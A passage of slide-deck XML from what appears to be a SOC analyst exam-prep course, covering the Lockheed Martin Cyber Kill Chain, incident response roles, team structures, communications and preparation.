  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Attack Frameworks (8)</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Kill chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on military F2T2EA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Find</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Fix</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Track</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Engage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Assess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639</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Lockheed Martin Cyber Kill Chain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The Lockheed Martin Cyber Kill Chain is a model that breaks an intrusion into seven sequential phases: reconnaissance, weaponization, delivery, exploitation, installation, command and control (C2), and actions on objectives. It frames an attack as a chain in which the adversary must complete each stage to reach their goal, so breaking any link disrupts the overall attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In practice defenders map controls and detections to each phase, aiming to detect or deny the adversary as early as possible, because stopping delivery or exploitation is far cheaper and safer than reacting after the attacker has established C2 or begun exfiltration during actions on objectives. The model also encourages layering defenses so multiple opportunities exist to break the chain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because the kill chain guides detection coverage, incident scoping, and course-of-action planning, though analysts should recognize its linearity is a limitation and often combine it with ATT&amp;CK, which better captures non-linear, real-world techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions asking you to place an observed action in the correct kill-chain phase or to explain how disrupting an early stage such as delivery stops the intrusion before actions on objectives.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640</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · ATTACK FRAMEWORKS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Lockheed Martin Cyber Kill Chain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g_34df8d5619.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4351845" y="1783080"/>
            <a:ext cx="3485262" cy="4434840"/>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641</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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IR Process Key Roles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Effective incident response depends on clearly defined roles that ensure the right authority, knowledge, and support are available when an incident occurs. Senior leaders must be included in the decision-making process because their visibility and support secure resources, help address regulatory and legal obligations, and provide the authority to make hard containment decisions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Leadership and dedicated coordinators also act as a buffer between the technical IR team and other personnel or executives, shielding responders from distraction so they can work while keeping stakeholders appropriately informed. Team composition should be scaled to the scope of the incident, bringing in the right knowledge and experience to meet the specific problem, and any outside resources such as forensic firms or legal counsel need coordination and pre-set parameters like retainers and contact procedures so they can be engaged quickly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because these roles and an agreed escalation path for escalated IR determine how smoothly a response runs under pressure, and gaps in sponsorship or unclear authority are a common reason incidents are handled slowly or incorrectly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on who must be involved in incident response, especially the value of senior-leadership sponsorship, defined escalation, and coordinating outside resources under pre-set parameters.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642</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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IR Process Key Roles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Senior leaders</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Include in decision-making process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Visibility &amp; support</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Address regulatory issues</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Buffer between IR team &amp; personnel/leaders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643</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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IR Process Key Roles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Team composition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Response based on scope of incident management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Bring in the right knowledge &amp; experience to meet the problem</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Outside resources need coordination &amp; pre-set parameters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Escalated IR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Need strict guidelines, policies, &amp; notification requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  May be subject to penalties or legal ramifications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644</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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IR Process Key Roles (3)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g_dc65adb904.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1317482" y="1783080"/>
            <a:ext cx="9553987" cy="4434840"/>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645</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Team Structure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Organizations structure their incident response or CSIRT capability in one of three common models depending on their size, geography, and resources. A central response team is a single team that addresses incidents as they come up across the whole organization, and it works well for smaller or single-site organizations because coordination is simple and expertise is consolidated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A distributed response team is used by larger organizations and consists of geographically or business-unit separate teams that handle incidents in their own areas while coordinating under shared processes, providing local coverage and time-zone reach at the cost of tighter coordination requirements. An outsourced response team is provided by an outside organization that responds to incidents as a service, letting a company obtain specialized skills and around-the-clock coverage without maintaining full in-house staff.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because the chosen structure shapes response times, escalation paths, and where authority and knowledge reside, and many organizations blend these models, keeping a small internal team that engages an outsourced provider for surge capacity or specialized forensics.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam asks you to match an organization's size and geography to the appropriate CSIRT model — central, distributed, or outsourced — and to know their respective trade-offs.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646</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Team Structure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Central response team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Organic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Address incidents as they come up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Distributed response team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Larger organizations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Geographically separate teams that address incidents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Outsourced response team</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Outside the organization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Responds to incidents as a service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647</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Communications Process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The communications process defines who may know about an incident, how information about it is shared, and through what secure channels, so that response is coordinated while leaks and premature disclosure are prevented. A trusted core group, sometimes called the circle of trust, is kept deliberately small and operates on a need-to-know basis, expanding only to the key internal staff and external partners (legal counsel, law enforcement, regulators, PR, third-party responders) that each stage of the response actually requires.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Disclosure timing and audience are often dictated by regulatory or legislative requirements, such as breach-notification laws that impose deadlines for informing affected individuals and authorities, so the plan must specify what is said, to whom, and when. Out-of-band, encrypted communication channels are used because an attacker who has compromised email or chat could otherwise read the response team's messages, and a clear policy governs what employees are and are not permitted to say about the incident to limit rumor, reputational damage, and evidence contamination.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because a technically sound response can still fail legally or reputationally if information flows to the wrong people, tips off the attacker, or violates a mandatory notification window.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking who should be notified, when regulatory disclosure is required, or why the team must use secure out-of-band channels and enforce need-to-know.</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648</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Communications Process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Circle of trust</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Key staff, internal &amp; external partners</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Disclosure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on regulatory or legislative requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Need-to-know</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Damage control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Let employees know about incident</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Policy of talking about the incident</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Secure communications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Avoid leaks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649</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Responsibilities &amp; Coordination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Responsibilities and coordination mean that every role in the incident response effort is clearly defined and documented in advance, so that when an incident occurs each person knows exactly what they are accountable for rather than improvising under pressure. The assignments must be understandable and unambiguous, covering the incident commander, technical responders, communications lead, legal and management liaisons, and any external partners, so handoffs are clean and no critical task is left owner-less.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The plan should also be portable, meaning it is accessible and usable across teams, locations, and even when primary systems or key personnel are unavailable, for example through printed copies or an out-of-band store that survives a network outage. Coordination ties these roles together so parallel workstreams such as containment, evidence collection, and stakeholder updates progress without conflict or duplication.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts rely on this clarity to escalate correctly and act within their authority, because confusion over who is in charge or who can approve actions like isolating a system directly slows response and increases damage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test knowing which role performs a given action or approves an escalation, and why documented, portable role assignments matter during an active incident.</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650</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ROLES AND RESPONSIBILITIES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Responsibilities &amp; Coordination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Clearly defined</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Understandable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Portable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651</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Preparation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Preparation is the first phase of incident response and the only one that aims to prevent incidents from happening in the first place, rather than reacting after the fact. It is built on three pillars: people (trained staff, defined roles, awareness), process (documented policies, playbooks, and communication plans), and technology (the tools, monitoring, and defensive controls that support the team).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Concrete preparation activities include network and host hardening, such as disabling unnecessary services, enforcing least privilege, and configuring secure baselines, together with disciplined patch and update management to close known vulnerabilities before they are exploited. It also means having the response toolkit, jump kits, contact lists, and logging in place and tested before an incident, not scrambling to assemble them mid-crisis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because the quality of preparation directly determines how fast and effectively the team can detect, contain, and recover; weak preparation turns a minor event into a major breach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
